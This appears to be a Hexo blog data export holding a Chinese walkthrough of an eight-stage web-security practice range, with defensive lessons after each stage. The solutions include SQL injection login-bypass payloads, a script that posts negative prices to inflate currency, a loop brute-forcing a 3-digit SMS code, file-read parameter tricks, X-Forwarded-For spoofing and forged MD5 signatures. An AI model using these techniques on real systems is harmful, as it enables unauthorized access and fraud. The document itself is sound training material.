揭密\n老规范，查看页面代码，如下图所示：\n![关卡6-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png)\n![关卡6-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png)\n\n再结合Tips说密码被放在了php代码里。巧的是页面里的图片也是通过后缀为php的url生成的。\n由此可知，这个php页面就是stage6.php。如此同时，这个服务还支持file参数。\n\n于是，可以尝试设file值为../stage6.php、stage6.php、sohu/stage6.php、../sohu/stage6.php等等获取php代码内容。\n\n最后发现该php代码文件获取链接地址为：http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php\n\n查看页面内容如下图所示：\n![关卡6-php代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png)\n![关卡6-php代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png)\n\n额，其实这是一个jsp页面，只是以jsp为后缀的url被jetty使用默认的servlet自动转发了，不得以只好用php做为后缀用了。\n\n总之，最后能获取到了密码为：sATa3HGe6\n\n### 4. 小结\n不要以实际文件路径为文件请求参数。\n如果服务需要的文件可枚举，则可以在后端限制可获取文件范围；或者把所有需要的文件放置于一个特定目标，只允许访问通过服务获取此目标下的文件。\n\n\n## 0x07 关卡7\n伪造ip地址\n\n### 1. 提示\n提示如下：\n> 任务目标：请获得本页面的访问权限\nTips：一会公开的来源控制方法也许并不安全\n\n### 2. 界面\n界面如下图所示：\n![关卡7]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png)\n![关卡7]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png)\n\n### 3. 揭密\n点击“验证权限”发现系统给出如下提示：\n![关卡7-提示]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png)\n![关卡7-提示]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png)\n\n提示内容：你不是来自于127.0.0.1的访客。反过来，提示的意思可以理解为只有IP地址来自于127.0.0.1的用户才有访问的权限。\n\n于是则需要伪造请求ip地址为127.0.0.1。\n一般地，涉及到ip地址的请求头有：X-Real-IP、X-Forwarded-For、Host。\n伪造ip时，一一尝试，最终发现设置 X-Forwarded-For 为127.0.0.1 成功通关。\n\n### 4. 补充内容\n\n#### 请求头信息修改工具\n使用chrome插件工具ModHeader来修改请求头信息：https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj\n\n#### 客户端IP流转\n服务器经过Apache,Squid等反向代理软件层层代理转发后，其原始IP地址可能会丢失。\n\n服务器通过`request.getRemoteAddr();`只能获取直接请求的ip地址。\n对于服务器之上架设有代理服务器的，则是代理服务器的ip地址；对于用户直接访问服务器，中间并没有代理服务器的情况，获取的ip地址才是用户真正的ip地址。\n\n对于服务器代理产生的ip丢失情况，一些反射代理服务器开始引入X-Forwarded-For和X-Real-IP等非正式的http协议头，用于保存原始客户端的ip地址。\n\n一般地，服务器程序会优先从X-Forwarded-For和X-Real-IP二个协议头里取ip地址，没有再从request里取ip地址。\n**注**：CRM后端代码还是额外check Proxy-Client-IP和WL-Proxy-Client-IP协议头。\n\n参考：[Java获取客户端IP](http://www.cnblogs.com/ITtangtang/p/3927768.html)\n\n### 5. 小结\n大家通用的客户端ip地址获取方法，经过代理服务器转发后，并不一定可靠。\n因此，使用ip来做权限上的限制也并不是100%安全的。\n\n\n## 0x08 关卡8\n\n### 1. 准备\n\n#### 二维码生成\n生成二维码工具：\n- http://cli.im/\n- http://liantu.com/\n\n生成内容：\nhttp://10.4.236.115:8080/sohu/stage7?level=7&username=yeshaoting&time=1457452800&verify=c6ce17b02eb15fd1831267a8736bd933\n\n#### 二维码解码\n推荐使用：http://tool.oschina.net/qr?type=2\n试过其他的几个不能解码中间有logo图片的二维码。\n\n### 2. 提示\n提示如下：\n> 任务目标：请主动设置你的过关级别为8\nTips：你猜到他们猜不到你猜得到他们猜不到你猜得到\n\n### 2. 界面\n界面如下图所示：\n![关卡8]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png)\n![关卡8]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png)\n\n### 3. 揭密\n第8关上来就是一个大大的二维码。\n通过二维码反解工具，得到一个网址：http://10.4.236.115:8080/sohu/stage7?level=7&username=yeshaoting&time=1457452800&verify=c6ce17b02eb15fd1831267a8736bd933。\n\n由于我们第7关已经过关，因此这个url还需要变通一下。修改后完成的url为：http://10.4.236.115:8080/sohu/stage8?level=8&username=yeshaoting&time=1457452800&verify=c6ce17b02eb15fd1831267a8736bd933。\n\n直接提示：\"这是一次已经过期的提交，请在2分钟内完成请求提交。\"\n由此可见，参数time不在2分钟内。反查查秒级时间得到内容为：2016-03-09 00:00:00，确认不是当时时间2分钟内。\n\n修改time内容为当前时间后再提交，提示：\"请求在服务器端验证失败。\"。\n可以猜测，参数verify不对。这个verfiy一看就是经过md5加密的。\n\n根据开发时与第三方接口对接的经验，verfiy是通过前面几个参数按照某种规则生成的。\n如是，依次尝试主流的微信、腾讯、淘宝开放平台，最终发现与腾讯开放平台的签名规则相似。\n\n第1步：将level、username、time三个参数进行字典序排序。\n第2步：将第1步中排序后的参数(key=value)用&拼接起来：level=8&time=1457452800&username=yeshaoting。\n第3步：对第2步内容进行md5加密，得到verfity值。\n\n\n### 4. 补充知识：签名规则\n\n#### 微信开放平台\n参见：[微信签名规则](http://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421135319&token=&lang=zh_CN)\n![关卡8-微信签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png)\n![关卡8-微信签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png)\n\n#### 腾讯开放平台\n参见：[腾讯签名规则](http://wiki.open.qq.com/wiki/%E8%85%BE%E8%AE%AF%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E7%AD%BE%E5%90%8D%E5%8F%82%E6%95%B0sig%E7%9A%84%E8%AF%B4%E6%98%8E)\n![关卡8-腾讯签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png)\n![关卡8-腾讯签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png)\n\n#### 淘宝开放平台\n参见：[淘宝签名规则](http://open.taobao.com/doc2/detail.htm?articleId=101617&docType=1&treeId=1#s5)\n![关卡8-淘宝签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png)\n![关卡8-淘宝签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png)\n\n### 5. 小结\n签名方式尽量与市面上的一些规则区分开。\n签名规则也是有可能会被猜出，可以通过一些别的类似于关卡5小结里的限制来辅助提高安全性。\n","source":"_posts/article/security/WEB安全渗透分享.md","raw":"title: WEB安全渗透分享\ntags:\n  - 渗透\ncategories:\n  - 信息安全\ndate: 2016-03-15 18:08:00\n---\n<img src=\"/asserts/images/logo/hack.png\" class=\"img-logo img-center\" />\n\n\nWEB安全渗透靶场：http://10.4.236.115:8080/\n是否开放所有关卡切换：http://10.4.236.115:8080/sohu/switchOpenStage\n\n\n## 0x00 前言\n此次分享内容旨在加深开发工作中的安全意识，也希望能起到抛砖引玉的作用，在分享完成后的讨论环节大家也说说自己现在或者曾经遇到过的安全问题。\n\n为了让大家能参与其中，对WEB安全问题有个更具象的认识。周末二天基于 `angularjs`、`jquery`、`spring`、`spring mvc`、`mybatis`、`mysql` 搭建一个比较粗糙的WEB安全靶场，复刻自参加的第一屇搜狐安全擂台赛，供大家hack。\n如发现问题，请各位见谅哈。\n\n\n### 1. 用户登记\n主要是为了收集用户名信息，进行登记，用于记录闯关进度!\n\n界面如下图所示：\n![用户登记]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png)\n![用户登记]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png)\n\n\n### 2. 用户主页\n简单地展示用户当前进度，并提供进入下一关的入口。后续可以扩展，显示击败百分之多少的对手。\n\n界面如下图所示：\n![用户主页]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png)\n![用户主页]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png)\n\n\n<!-- more -->\n\n## 0x01 关卡1\n属于热身题，纯属练手，引导用户在之后的关卡中找到更多破解信息。\n\n### 1. 提示\n提示如下：\n> 任务目标：找出正确的用户名与密码并通过验证。\nTips：这个页面用户与密码不需要去服务器交互验证。\n\n### 2. 界面\n界面如下图所示：\n![关卡1]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png)\n![关卡1]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png)\n\n### 3. 揭密\n用户名密码直接写在了页面的js逻辑里，跟随页面元素js操作即可找到对应的内容。\n![关卡1-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png)\n![关卡1-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png)\n![关卡1-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png)\n![关卡1-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png)\n\n由此，可见第一关的用户名密码如下：\n``` javascript\nvar stage1Username = \"stage1_user\";\nvar state1Password = \"tHis1Is3aSim3p#ab$\";\n```\n\n### 4. 小结\n一般不会出现此类小白程序员的情况。\n\n\n## 0x02 关卡2\n这是一道SQL注入题。\n\nSQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。\n\n### 1. 提示\n提示如下：\n> 任务目标：本题没有可登入的用户名密码，请绕过登录验证。\nTips：就算是判断了用户名 and 密码 都正确，也是被禁用的。\n\n### 2. 界面\n界面如下图所示：\n![关卡2]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png)\n![关卡2]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png)\n\n### 3. 揭密\n对于sql而言，有些特殊字符（如：单引号，--，\\，#等）、保留字（如：select，values，delete等）和内置函数（date，time，concat等），使用不当都有可能会导致SQL执行错误。\n\n由此，我们尝试使用单引号，发现登录异常提示如下：\n![特殊字符注入]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png)\n![特殊字符注入]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png)\n\n并且，发现在控制台出现如下异常信息：\n``` bash\nStatementCallback; bad SQL grammar [select count(id) from user2 where username = ''' and password = '']; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and password = ''' at line 1\n```\n\n从异常内容可以发现，出错的SQL内容为：\n``` sql\nselect count(id) from user2 where username = ''' and password = ''\n```\n\n于是乎就从盲目地注入，变成了有针对性的注入。\n针对于此，可以填写如下内容进入SQL注入：\n``` sql\nusername: \\\npassword: or '' = '\n\nusername: \\\npassword: or 1 != '\n\nusername: ' or 1 !=\npassword: '--\n\nusername: ' or 1 !=\npassword: '--\n\nusername: ' or 1=1 -- x\nusername: ' or 1=1 #\n```\n\n**注**：答案可以很多。\n\n\n### 4. 小结\n- 避免出现一些详细的错误消息，异常不要抛出来，在服务器端打印日志用于异常分析就好。\n- 永远不要使用动态拼装sql，使用数据库或开发框架提供的参数化查询接口。\n- 机密信息不要直接存放，加密或者hash密码和敏感的信息再存储。\n- 用户输入过滤：对特殊字符单引号和双\"-\"等进行转义处理或编码转换。\n- SQL注入检测工具进行检测。如：sqlmap、SQLninja等。\n\n\n### 5. 参考文档\n- [SQL 注入](http://php.net/manual/zh/security.database.sql-injection.php)\n- [SQL注入技术](http://baike.baidu.com/view/3896.htm#3)\n- [9.4 避免SQL注入](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md)\n\n\n## 0x03 关卡3\n\n### 1. 提示\n提示如下：\n> 任务目标：找到通关后台，并将自己的通关数目加一级\nTips：答案不在本页\n\n### 2. 界面\n界面如下图所示：\n![关卡3]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png)\n![关卡3]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png)\n\n### 3. 揭密\n由提示找到通关后台可知，找到后台是关键。\n一般地，常规后台命名为admin、admin\\index、manage、dashboard等。\n\n尝试如下地址：http://localhost:8080/sohu/index#/admin\n于是进入了后台管理界面，如下图所示：\n![WEB安全渗透实战-后台管理系统\n]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png)\n]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png)\n![后台管理系统-升级]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png)\n![后台管理系统-升级]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png)\n\n尝试点击**升级**直接通关，其他所有内容其实都是假的。\n\n\n### 4. 小结\n后台弱口令\n\n\n## 0x04 关卡4\n将非最高价格物品价格修改为负值，从而增加自己的虚拟货币，然后再买最高价格物品。\n\n### 1. 提示\n提示如下：\n> 任务目标：通过本页面提供的虚拟货币购买价值最高的物品\nTips：0 - (-1) = 1\n\n### 2. 界面\n界面如下图所示：\n![关卡4]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png)\n![关卡4]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png)\n\n### 3. 揭密\n由于初始时每人只拥有5000000的虚拟货币，完全不只以购买价值最高的物品。\n因为要购买前需要增加自己的虚拟货币。\n\n再根据下面的提示说0 - (-1) = 1，可与购买联想到：购买物品时，修改传到后端的价格为负数，来达到为自己增加虚拟货币的目的。\n\n于是我们尝试购买价格为399的物品。系统提示：购买成功，但是未购买价值最高的物品，如下图所示：\n![未购买最高价值的物品]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png)\n![未购买最高价值的物品]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png)\n\n我们再通过console可以看到，发出的POST请求为：http://10.4.236.115:8080/sohu/stage4/pass?id=1&price=399\n\n查看购买的js请求代码如下：\n![关卡4-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png)\n![关卡4-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png)\n\n在下一次购买请求时，设置price值为 -7999999 。请求完成后，依然提示购买失败的消息，但是虚拟货币却变成了：12999600。\n\n于是，我们就可以开开心心地购买最高价格的物品了。\n\n完成的js操作如下所示：\n``` javascript\n// 增加虚拟货币\nvar url = 'http://10.4.236.115:8080/sohu/stage4/pass?id=1&price=-7999999';\n$.ajax({\n    method: 'post',\n    async: false,\n    url: url,\n    success: function(data) {\n        if (data.status == 200) {\n            console.log('SUCCESS');\n        }\n    }\n});\n\n// 购买最高价格物品\nvar url = 'http://10.4.236.115:8080/sohu/stage4/pass?id=3&price=7999999';\n$.ajax({\n    method: 'post',\n    async: false,\n    url: url,\n    success: function(data) {\n        if (data.status == 200) {\n            console.log('SUCCESS');\n        }\n    }\n});\n```\n\n### 4. 小结\n虽然做了不能够买比自己持有总金额高的物品的检验，但是未校验物品金额不允许为负数，也未校验id对应的物品金额与实际金额是否相符。\n对于关键逻辑，对参数做更加严格的校验。\n\n\n## 0x05 关卡5\n暴力破解\n\n### 1. 提示\n提示如下：\n> 任务目标：通过收到的短信验证码完成手机验证。\nTips：有时候采用最原始的方法收到的效果反而更显著。\n\n### 2. 界面\n界面如下图所示：\n![关卡5]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png)\n![关卡5]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png)\n\n### 3. 揭密\n从Tips里提到的最原始的方法，大概能猜测到最直接的破解方式：**字典破解** 或 **暴力破解**。\n要么验证码是个弱密码，要么验证码很方便枚举出来。\n\n接下来，点击“获取短信验证码”，提示：新的3位数字验证码已经通过短信，发送到13800138000的手机上，请注意查收！\n因此，可见验证码可以枚举出来，只需要发起不超过1000次请求即可找到验证码。\n\n看过js请求代码，了解请求构造后，可以使用如下操作暴破：\n``` javascript\nvar url = 'http://10.4.236.115:8080/sohu/sms/code/verfiy';\nvar len = 1000;\nfor (var i = 0; i < len; i++) {\n\t$.ajax({\n\t\tmethod: 'post',\n        async: false,\n\t\turl: url + '?phone=13800138000&code=' + i,\n\t\tsuccess: function(data) {\n\t\t\tif (data.status == 200) {\n\t\t\t\tconsole.log('code:' + i);\n\t\t\t\ti = len;\n\t\t\t}\n\t\t}\n\t});\n}\n```\n\n暴破完成后，会打印出对应的验证码，之后即可通过dashboard页直接进入下一关。\n\n**注**：考虑验证码可能会补扩散开，因此每次有人过关，验证码就会重新刷新一次。\n\n### 4. 小结\n尽量不要设置容易枚举的密码或验证码。同时，对于敏感信息可以加上一些限制，类似于：时效性限制或者一天内允许尝试失败次数等。\n\n\n## 0x06 关卡6\n读取服务器上的文件\n\n### 1. 提示\n提示如下：\n> 任务目标：找到可以通过本关的密码并提交。\nTips：密码被硬编码到了当前页面服务器上的php代码里。\n\n### 2. 界面\n界面如下图所示：\n![关卡6]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png)\n![关卡6]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png)\n\n### 3. 揭密\n老规范，查看页面代码，如下图所示：\n![关卡6-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png)\n![关卡6-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png)\n\n再结合Tips说密码被放在了php代码里。巧的是页面里的图片也是通过后缀为php的url生成的。\n由此可知，这个php页面就是stage6.php。如此同时，这个服务还支持file参数。\n\n于是，可以尝试设file值为../stage6.php、stage6.php、sohu/stage6.php、../sohu/stage6.php等等获取php代码内容。\n\n最后发现该php代码文件获取链接地址为：http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php\n\n查看页面内容如下图所示：\n![关卡6-php代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png)\n![关卡6-php代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png)\n\n额，其实这是一个jsp页面，只是以jsp为后缀的url被jetty使用默认的servlet自动转发了，不得以只好用php做为后缀用了。\n\n总之，最后能获取到了密码为：sATa3HGe6\n\n### 4. 小结\n不要以实际文件路径为文件请求参数。\n如果服务需要的文件可枚举，则可以在后端限制可获取文件范围；或者把所有需要的文件放置于一个特定目标，只允许访问通过服务获取此目标下的文件。\n\n\n## 0x07 关卡7\n伪造ip地址\n\n### 1. 提示\n提示如下：\n> 任务目标：请获得本页面的访问权限\nTips：一会公开的来源控制方法也许并不安全\n\n### 2. 界面\n界面如下图所示：\n![关卡7]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png)\n![关卡7]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png)\n\n### 3. 揭密\n点击“验证权限”发现系统给出如下提示：\n![关卡7-提示]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png)\n![关卡7-提示]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png)\n\n提示内容：你不是来自于127.0.0.1的访客。反过来，提示的意思可以理解为只有IP地址来自于127.0.0.1的用户才有访问的权限。\n\n于是则需要伪造请求ip地址为127.0.0.1。\n一般地，涉及到ip地址的请求头有：X-Real-IP、X-Forwarded-For、Host。\n伪造ip时，一一尝试，最终发现设置 X-Forwarded-For 为127.0.0.1 成功通关。\n\n### 4. 补充内容\n\n#### 请求头信息修改工具\n使用chrome插件工具ModHeader来修改请求头信息：https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj\n\n#### 客户端IP流转\n服务器经过Apache,Squid等反向代理软件层层代理转发后，其原始IP地址可能会丢失。\n\n服务器通过`request.getRemoteAddr();`只能获取直接请求的ip地址。\n对于服务器之上架设有代理服务器的，则是代理服务器的ip地址；对于用户直接访问服务器，中间并没有代理服务器的情况，获取的ip地址才是用户真正的ip地址。\n\n对于服务器代理产生的ip丢失情况，一些反射代理服务器开始引入X-Forwarded-For和X-Real-IP等非正式的http协议头，用于保存原始客户端的ip地址。\n\n一般地，服务器程序会优先从X-Forwarded-For和X-Real-IP二个协议头里取ip地址，没有再从request里取ip地址。\n**注**：CRM后端代码还是额外check Proxy-Client-IP和WL-Proxy-Client-IP协议头。\n\n参考：[Java获取客户端IP](http://www.cnblogs.com/ITtangtang/p/3927768.html)\n\n### 5. 小结\n大家通用的客户端ip地址获取方法，经过代理服务器转发后，并不一定可靠。\n因此，使用ip来做权限上的限制也并不是100%安全的。\n\n\n## 0x08 关卡8\n\n### 1. 准备\n\n#### 二维码生成\n生成二维码工具：\n- http://cli.im/\n- http://liantu.com/\n\n生成内容：\nhttp://10.4.236.115:8080/sohu/stage7?level=7&username=yeshaoting&time=1457452800&verify=c6ce17b02eb15fd1831267a8736bd933\n\n#### 二维码解码\n推荐使用：http://tool.oschina.net/qr?type=2\n试过其他的几个不能解码中间有logo图片的二维码。\n\n### 2. 提示\n提示如下：\n> 任务目标：请主动设置你的过关级别为8\nTips：你猜到他们猜不到你猜得到他们猜不到你猜得到\n\n### 2. 界面\n界面如下图所示：\n![关卡8]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png)\n![关卡8]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png)\n\n### 3. 揭密\n第8关上来就是一个大大的二维码。\n通过二维码反解工具，得到一个网址：http://10.4.236.115:8080/sohu/stage7?level=7&username=yeshaoting&time=1457452800&verify=c6ce17b02eb15fd1831267a8736bd933。\n\n由于我们第7关已经过关，因此这个url还需要变通一下。修改后完成的url为：http://10.4.236.115:8080/sohu/stage8?level=8&username=yeshaoting&time=1457452800&verify=c6ce17b02eb15fd1831267a8736bd933。\n\n直接提示：\"这是一次已经过期的提交，请在2分钟内完成请求提交。\"\n由此可见，参数time不在2分钟内。反查查秒级时间得到内容为：2016-03-09 00:00:00，确认不是当时时间2分钟内。\n\n修改time内容为当前时间后再提交，提示：\"请求在服务器端验证失败。\"。\n可以猜测，参数verify不对。这个verfiy一看就是经过md5加密的。\n\n根据开发时与第三方接口对接的经验，verfiy是通过前面几个参数按照某种规则生成的。\n如是，依次尝试主流的微信、腾讯、淘宝开放平台，最终发现与腾讯开放平台的签名规则相似。\n\n第1步：将level、username、time三个参数进行字典序排序。\n第2步：将第1步中排序后的参数(key=value)用&拼接起来：level=8&time=1457452800&username=yeshaoting。\n第3步：对第2步内容进行md5加密，得到verfity值。\n\n\n### 4. 补充知识：签名规则\n\n#### 微信开放平台\n参见：[微信签名规则](http://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421135319&token=&lang=zh_CN)\n![关卡8-微信签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png)\n![关卡8-微信签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png)\n\n#### 腾讯开放平台\n参见：[腾讯签名规则](http://wiki.open.qq.com/wiki/%E8%85%BE%E8%AE%AF%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E7%AD%BE%E5%90%8D%E5%8F%82%E6%95%B0sig%E7%9A%84%E8%AF%B4%E6%98%8E)\n![关卡8-腾讯签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png)\n![关卡8-腾讯签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png)\n\n#### 淘宝开放平台\n参见：[淘宝签名规则](http://open.taobao.com/doc2/detail.htm?articleId=101617&docType=1&treeId=1#s5)\n![关卡8-淘宝签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png)\n![关卡8-淘宝签名规则]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png)\n\n### 5. 小结\n签名方式尽量与市面上的一些规则区分开。\n签名规则也是有可能会被猜出，可以通过一些别的类似于关卡5小结里的限制来辅助提高安全性。\n","slug":"article/security/WEB安全渗透分享","published":1,"updated":"2016-08-25T12:55:05.000Z","_id":"cis6vlxup006r5nbt2z0ttom6","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src=\"/asserts/images/logo/hack.png\" class=\"img-logo img-center\"></p>\n<p>WEB安全渗透靶场：<a href=\"http://10.4.236.115:8080/\" target=\"_blank\" rel=\"external\">http://10.4.236.115:8080/</a><br>是否开放所有关卡切换：<a href=\"http://10.4.236.115:8080/sohu/switchOpenStage\" target=\"_blank\" rel=\"external\">http://10.4.236.115:8080/sohu/switchOpenStage</a></p>\n<h2 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h2><p>此次分享内容旨在加深开发工作中的安全意识，也希望能起到抛砖引玉的作用，在分享完成后的讨论环节大家也说说自己现在或者曾经遇到过的安全问题。</p>\n<p>为了让大家能参与其中，对WEB安全问题有个更具象的认识。周末二天基于 <code>angularjs</code>、<code>jquery</code>、<code>spring</code>、<code>spring mvc</code>、<code>mybatis</code>、<code>mysql</code> 搭建一个比较粗糙的WEB安全靶场，复刻自参加的第一屇搜狐安全擂台赛，供大家hack。<br>如发现问题，请各位见谅哈。</p>\n<h3 id=\"1-用户登记\"><a href=\"#1-用户登记\" class=\"headerlink\" title=\"1. 用户登记\"></a>1. 用户登记</h3><p>主要是为了收集用户名信息，进行登记，用于记录闯关进度!</p>\n<p>界面如下图所示：<br>![用户登记]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png</a>)<br>![用户登记]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png</a>)</p>\n<h3 id=\"2-用户主页\"><a href=\"#2-用户主页\" class=\"headerlink\" title=\"2. 用户主页\"></a>2. 用户主页</h3><p>简单地展示用户当前进度，并提供进入下一关的入口。后续可以扩展，显示击败百分之多少的对手。</p>\n<p>界面如下图所示：<br>![用户主页]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png</a>)<br>![用户主页]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png</a>)</p>\n<a id=\"more\"></a>\n<h2 id=\"0x01-关卡1\"><a href=\"#0x01-关卡1\" class=\"headerlink\" title=\"0x01 关卡1\"></a>0x01 关卡1</h2><p>属于热身题，纯属练手，引导用户在之后的关卡中找到更多破解信息。</p>\n<h3 id=\"1-提示\"><a href=\"#1-提示\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：找出正确的用户名与密码并通过验证。<br>Tips：这个页面用户与密码不需要去服务器交互验证。</p>\n</blockquote>\n<h3 id=\"2-界面\"><a href=\"#2-界面\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡1]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png\" target=\"_blank\" rel=\"external\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png</a>)<br>![关卡1]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png\" target=\"_blank\" 